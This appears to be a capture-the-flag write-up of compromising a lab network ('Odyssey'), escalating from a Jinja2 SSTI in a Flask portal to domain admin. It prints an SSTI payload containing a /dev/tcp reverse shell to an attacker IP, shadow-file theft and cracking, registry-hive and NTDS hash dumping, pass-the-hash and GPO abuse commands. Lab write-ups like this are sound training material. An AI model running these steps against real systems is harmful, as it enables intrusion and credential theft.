# 📝 Attack Surface Summary (Non-Offensive)

### 🔵 10.1.206.2 — Domain Controller

- Full AD service stack exposed: LDAP, Kerberos, Global Catalog, SMB, DNS, RDP.
    
- SSL/TLS certificate consistent with a typical AD CA setup.
    
- No WinRM (5985), unusual for AD but possible depending on policy.
    

### 🟢 10.1.182.10 — Windows Member Host

- Standard RPC + SMB + RDP exposure.
    
- Likely a workstation or an application server.
    

### 🟠 10.1.66.62 — Linux Web Server

- Runs a Python Werkzeug app (“Odyssey Portal”) on port 5000.
    
- SSH available with modern OpenSSH.

### SMB
 I first created a Winhosts file with the two IP addresses, and then used nxc to generate my /etc/hosts file.
```
 > cat WinHosts
10.1.206.2
10.1.182.10
```
```
nxc smb hosts.txt --generate-hosts-file hosts
SMB         10.1.206.2      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:hsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87)
```
```
cat hosts
10.1.206.2     DC01.hsm.local hsm.local DC01
10.1.182.10     EC2AMAZ-NS87CNK.hsm.local EC2AMAZ-NS87CNK
```

![1o](/assets/img/Writeup/Hacksmarter/Odyssey/1o.png)
### Kerbrute
 Using Kerbrute, I attempted to enumerate valid usernames on the Domain Controller, but without success.
```
kerbrute userenum --domain "hsm.local"  --dc DC01.hsm.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```
![2o](/assets/img/Writeup/Hacksmarter/Odyssey/2o.png)

## Web Enumeration

 On the Linux machine, I accessed the web application running on port 5000 and immediately launched a Feroxbuster scan in the background, which identified a `/login` endpoint.

![3o](/assets/img/Writeup/Hacksmarter/Odyssey/3o.png)
![5o](/assets/img/Writeup/Hacksmarter/Odyssey/5o.png)

 By submitting a single quote in the login form, the application returned a SQL query error. This indicates that the endpoint is likely vulnerable to SQL injection.

![6o](/assets/img/Writeup/Hacksmarter/Odyssey/6o.png)
![7o](/assets/img/Writeup/Hacksmarter/Odyssey/7o.png)

 Based on this error, I though it was possible to craft a valid SQL query to bypass the login. In this case, I launched SQLMap in the background as follows:
```
sqlmap -u "http://10.1.66.62:5000/login" --batch --dbs --level 5 --risk 3
```
 However, this did not yield anything valuable. I also tested a basic XSS payload, which executed successfully but did not provide any useful results either.

## SSTI Discover
#### After taking a break and reconsidering the attack surface, I remembered the Enter your template input field. Initially, I tried supplying my own IP address to trigger a hit on Responder, but then I noticed that the input was being reflected in the response.

![9o](/assets/img/Writeup/Hacksmarter/Odyssey/9o.png)

 This immediately made me think of a potential SSTI (Server‑Side Template Injection) vulnerability.

```
{% raw %} {{7*7}} {% endraw %}
```
![11o](/assets/img/Writeup/Hacksmarter/Odyssey/11o.png)

 By testing a simple SSTI payload, I was able to confirm code execution on the server and retrieve the username `ghill_sa`.

```
{% raw %} {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} {% endraw %}
```

![10o](/assets/img/Writeup/Hacksmarter/Odyssey/10o.png)
### SSTI Exploitation

 Using the following resource:  
[Server-Side Template Injection with Jinja2](https://onsecurity.io/article/server-side-template-injection-with-jinja2/) 

 I identified suitable SSTI payload examples.
 This allowed me to confirm **remote code execution** under the user context **`ghill_sa`**.

 To proceed, I prepared my **listener** and crafted the payload.  
 I generated and sent the request through **Burp Suite**, as it provides a more convenient workflow for this type of testing.


```
pwncat-cs :443
```
```{% raw %}
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.200.22.195/443 0>&1"').read()}} {% endraw %}
```

![12o](/assets/img/Writeup/Hacksmarter/Odyssey/12o.png)
![13o](/assets/img/Writeup/Hacksmarter/Odyssey/13o.png)
## Post-Exploitation Enumeration

 After obtaining a shell, I uploaded **LinPEAS** and **pspy** to perform a thorough privilege‑escalation enumeration.

![14o](/assets/img/Writeup/Hacksmarter/Odyssey/14o.png)
### Sensitive SSH Key Exposure

 During enumeration, I discovered that the `.ssh` directory inside the `ghill_sa` home folder contained a private SSH key.  
 The presence of a private key stored in a user’s home directory represents a significant security risk, as an attacker could potentially download and attempt to use it for unauthorized authentication.

 This finding indicates improper key management practices and highlights the need for stronger access‑control policies and secure storage of SSH credentials. 

![15o](/assets/img/Writeup/Hacksmarter/Odyssey/15o.png)

 I uploaded the key, set its permissions to `600`, and attempted to connect as `root` and it worked.

![15.5o](/assets/img/Writeup/Hacksmarter/Odyssey/15.5o.png)

 Now that I had root access on the Linux host, my next steps were to consider potential pivoting options and perform local post‑exploitation enumeration.  
 This included reviewing the root directory and collecting interesting files for analysis.  
 I also inspected files such as `/etc/krb5.keytab` (in case the Linux host was integrated into the AD environment) as well as `/etc/passwd` and `/etc/shadow` to assess whether user password hashes could be recovered for offline analysis.

 Since the `/etc/krb5.keytab` file was not present on the system, I focused on other locally available credential sources.  
 I retrieved both `/etc/passwd` and `/etc/shadow` using scp.
 After combining them with an unshadowing process, I was able to extract valid password hashes.
```
scp -i id_ed25519 root@10.1.66.62:/etc/shadow .
shadow

scp -i id_ed25519 root@10.1.66.62:/etc/passwd .
passwd                         
```
![16o](/assets/img/Writeup/Hacksmarter/Odyssey/16o.png)

 Using John the Ripper for offline cracking, I successfully recovered the plaintext password from the extracted hash.  
 The password revealed was: **P@ssw0rd!**
![17](/assets/img/Writeup/Hacksmarter/Odyssey/17.png)

 With this recovered password, I attempted to authenticate against the DC and the `EC2AMAZ-NS87CNK` host using `nxc` to check for possible credential reuse across the Windows environment.

## Shell as ghill_sa on EC2AMAZ-NS87CNK
```
nxc rdp WinHosts -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth
```
![18](/assets/img/Writeup/Hacksmarter/Odyssey/18.png)

 With valid credentials confirmed, I was able to access the `EC2AMAZ-NS87CNK` machine through RDP.  
I connected using `xfreerdp` and began performing a full enumeration of the host to identify potential privilege‑escalation vectors and opportunities for lateral movement.

```
xfreerdp /u:ghill_sa /p:'P@ssw0rd!' /v:10.1.182.10 /dynamic-resolution /cert:ignore
```
### Smb Share
 After connecting to the machine, I explored the `C:\` drive.  
 Inside the `Share` directory, I found several notes and files left on the system, including the following discovery:

![20](/assets/img/Writeup/Hacksmarter/Odyssey/20.png)

```
Get-ChildItem *.txt | Where-Object { $_.Name -match "(Login|Access|Creds|Portal|Password)" } | ForEach-Object { Write-Host "`n=== $($_.Name) ===" -ForegroundColor Red; Get-Content $_.Name }
```

![23](/assets/img/Writeup/Hacksmarter/Odyssey/23.png)
 However, none of the passwords found in the notes were valid.  
 Running `whoami /all` revealed that the account belonged to a group with elevated or misconfigured privileges, indicating a potential privilege‑escalation path on the system.
![22](/assets/img/Writeup/Hacksmarter/Odyssey/22.png)
## Privilege escalation of Backup Operators group
 As the account was a member of the **Backup Operators** group, it could access and back up sensitive system files.  
 Using this privilege, I created backups of the SYSTEM, SAM, and SECURITY hives.  
 Once exported, these files allowed me to perform an offline credential extraction using secretdump, recovering all local account hashes.

```
reg.py /"ghill_sa":'P@ssw0rd!'@"10.1.182.10"  backup -o '\\10.200.22.195\EXEGOL'

smbserver.py -smb2support EXEGOL .
```

```
> ls
SAM.save  SECURITY.save  SYSTEM.save
```
```
 secretsdump.py LOCAL -system SYSTEM.save  -security SECURITY.save  -sam SAM.save
```

![25](/assets/img/Writeup/Hacksmarter/Odyssey/25.png)
 Now that I had recovered the local Administrator hash, I was able to use `netexec` to reset the account’s password.

```
nxc smb 10.1.182.10 -u 'Administrator' -H 'd5cad8a9782b2879bf316f56936f1e36' --local-auth  -x 'net user Administrator Password123!'
SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:None)
SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\Administrator:d5cad8a9782b2879bf316f56936f1e36 (admin)
SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  [+] Executed command via wmiexec
SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  The command completed successfully.
```
 With the new Administrator password set, I could access the `C$` administrative share using `smbclientng` and retrieve the  flag.


![26](/assets/img/Writeup/Hacksmarter/Odyssey/26.png)
## DC02
### Kerbrute
 With the `secretsdump` output, I created a user list and used Kerbrute to enumerate which accounts were valid.
```
> cat NewUsers.txt
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
ghill_sa
fin_user1
hr_admin
proj_mgr
db_readonly
audit_user
payroll_clerk

bbarkinson
```

```
kerbrute userenum --domain "hsm.local"  --dc DC01.hsm.local  NewUsers.txt
```
![27](/assets/img/Writeup/Hacksmarter/Odyssey/27.png)
 The *bbarkinson* account turned out to be valid, so let's try to authenticate using his NT hash.

```
nxc smb  10.1.206.2 -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc'
RDP         10.1.206.2      3389   DC01             [*] Windows 10 or Windows Server 2016 Build 26100 (name:DC01) (domain:hsm.local) (nla:True)
RDP         10.1.206.2      3389   DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc
```
 However, we can't perform Pass‑the‑Hash over RDP, so I went back to the Windows machine and tried to run SharpHound.  
 But the DC hostname wasn’t resolving properly, which prevented SharpHound from running correctly.


![28](/assets/img/Writeup/Hacksmarter/Odyssey/28.png)
![30](/assets/img/Writeup/Hacksmarter/Odyssey/30.png)
### Dns resolution on DC01
 To ensure that *dc01.hsm.local* resolves correctly, I had to fix the DNS settings on the Windows machine.  
 I went through:

 **Control Panel → Network and Internet → Network and Sharing Center → Change adapter settings**  
 → Right‑click the network adapter → **Properties**  
 → Double‑click **Internet Protocol Version 4 (TCP/IPv4)**

 In the DNS section, I set:

 - **Preferred DNS server:** IP address of the Domain Controller (DC01)  
 - **Alternate DNS server:** empty (or another DC if one exists)

 After applying these settings, the DC hostname finally resolved properly.


![31](/assets/img/Writeup/Hacksmarter/Odyssey/31.png)
![32](/assets/img/Writeup/Hacksmarter/Odyssey/32.png)
![33](/assets/img/Writeup/Hacksmarter/Odyssey/33.png)
 And now… check the magic. 
![34](/assets/img/Writeup/Hacksmarter/Odyssey/34.png)
 Now that the domain controller is finally resolving, we need a valid domain account to continue.  
 Since we already discovered the **bbarkinson** account  and because AD user accounts can, by default, create a limited number of computer objects  we can leverage this by attempting to create a new machine account in the domain.
### Creating a new user on DC01
![36](/assets/img/Writeup/Hacksmarter/Odyssey/36.png)
 We check the maq of **bbarkinson**.
```
 nxc ldap  10.1.206.2 -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc'  --local-auth -M maq

 We create the uzur account whit his Password.
```
nxc smb  10.1.206.2 -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc'   -M add-computer -o NAME="uzur" PASSWORD='Password123!' --dns-server 10.1.206.2

SMB         10.1.206.2      445    DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc
ADD-COMP... 10.1.206.2      445    DC01             Successfully added the machine account: "uzur$" with Password: "Password123!"
```
```
.\sh.exe -c all -d hsm.local --domaincontroller dc01.hsm.local --zipfilename dc01.zip --ldapusername uzur --ldappassword 'Password123!'
```
## Privesc On DC01
### GenericWrite over a GPO
  After importing the ZIP into BloodHound, we can see that *bbarkinson* has **GenericWrite** permissions on the *Finance Policy* GPO.

![37](/assets/img/Writeup/Hacksmarter/Odyssey/37.png)
 We can use **pygpoabuse** to modify and exploit this GPO by adding the compromised account *uzur* to the local Administrators group.
```
pygpoabuse.py hsm.local/bbarkinson   -hashes :53c3709ae3d9f4428a230db81361ffbc  -gpo-id "526CDF3A-10B6-4B00-BCFA-36E59DCD71A2" -dc-ip  10.1.206.2  -command 'net localgroup Administrators "uzur$" /add' -f
```

![38](/assets/img/Writeup/Hacksmarter/Odyssey/38.png)
 With the **ntds** option in NetExec — and now that our `uzur` account effectively holds Domain Administrator privileges thanks to the abused GPO — we can dump the **NTDS.dit** and extract all domain password hashes, including the Domain Administrator’s NT hash.
 After retrieving the hashes, we can authenticate as the Domain Administrator and finally obtain the **final flag**.

```
nxc smb dc01.hsm.local -u 'uzur$' -p 'Password123!' --ntds
```
![40](/assets/img/Writeup/Hacksmarter/Odyssey/40.png)
